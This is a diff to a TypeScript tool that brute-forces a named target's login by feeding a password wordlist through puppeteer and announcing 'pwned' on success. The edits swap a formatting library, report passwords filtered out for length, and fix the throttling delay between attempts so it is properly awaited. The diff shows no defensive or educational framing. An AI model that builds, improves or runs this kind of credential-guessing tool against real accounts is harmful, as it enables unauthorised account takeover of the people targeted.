@@ -1,15 +1,8 @@
-import chalk from "chalk";
 import yargs from "yargs";
 import fs from "fs";
 import puppeteer from "puppeteer";
-import { checkInternet, login } from "./utils.js";
-import { redAst, yellow, red, green, pwned } from "./constants.js";
-
-const delay = (time: number | undefined) => {
-	return new Promise(function (resolve) {
-		setTimeout(resolve, time);
-	});
-};
+import { boldText, checkInternet, login } from "./utils.js";
+import { redAst, yellow, red, green, pwned, warn } from "./constants.js";
 
 const opt = yargs(process.argv.slice(2))
 	.usage("\nUsage: ./index.js -t <target> -w <path/to/wordlist>")
@@ -62,13 +55,15 @@ const main = async () => {
 			}
 
 			passwds = fs.readFileSync(wordlist, "utf-8").split(/\r?\n/);
+			const filteredPasswds = passwds.length - 1 - passwds.filter((passwd) => passwd.length > 6).length;
 
 			console.log(yellow + `${passwds.length - 1} possible passwords loaded from ${wordlist}.`);
+			console.log(warn + `${filteredPasswds} password(s) were filtered out due to their length`);
 
 			for (let passwd of passwds) {
 				if (passwd.length <= 6) continue;
 
-				console.log(yellow + `Trying password ${chalk.bold(passwd)}.`);
+				console.log(yellow + `Trying password ${boldText(passwd)}.`);
 
 				if (executable) {
 					if (!fs.existsSync(String(executable))) {
@@ -94,10 +89,10 @@ const main = async () => {
 
 				if ((await loginTest) === false) {
 					console.log(red + `${passwd} is incorrect.`);
-					delay(delayTime);
+					await new Promise((resolve) => setTimeout(resolve, delayTime));
 				} else {
 					console.log(green + `${passwd} is correct.`);
-					console.log(pwned + `Successfully logged in as ${target} with password ${chalk.bold(passwd)}.`);
+					console.log(pwned + `Successfully logged in as ${target} with password ${boldText(passwd)}.`);
 
 					process.exit(0);
 				}
